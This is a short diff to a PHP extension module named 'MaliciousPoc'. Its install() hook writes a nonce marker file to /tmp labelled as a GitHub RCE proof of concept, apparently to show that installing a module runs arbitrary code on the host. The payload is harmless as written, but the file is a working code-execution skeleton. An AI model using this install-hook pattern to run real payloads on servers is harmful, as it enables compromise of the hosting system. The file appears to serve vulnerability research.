@@ -3,35 +3,23 @@
 namespace Modules\MaliciousPoc;
 
 use App\Extension\AbstractModule;
-use Illuminate\Support\Facades\Log;
 
 class Module extends AbstractModule
 {
     public function install(): bool
     {
-        Log::info('[EXP] install() called');
+        parent::install();
 
-        $markerPath = '/tmp/sqrtrev_marker_' . uniqid() . '.txt';
         $nonce = bin2hex(random_bytes(8));
-        
-        $content = "SQRTREV_MARKER: {$nonce}\n";
-        $content .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
-        
-        file_put_contents($markerPath, $content);
-        
-        Log::info("[EXP] marker written: {$markerPath}");
+        $marker_file = "/tmp/sqrtrev_github_rce_" . substr($nonce, 0, 8) . ".txt";
+        $marker_content = "SQRTREV_GITHUB_RCE_POC: " . $nonce . "\n";
+        file_put_contents($marker_file, $marker_content);
 
-        return parent::install();
+        return true;
     }
 
-    public function boot()
+    public function uninstall(): bool
     {
-        parent::boot();
-    }
-
-    public function register()
-    {
-        $this->registerConfig();
-        $this->registerProviders();
+        return parent::uninstall();
     }
 }
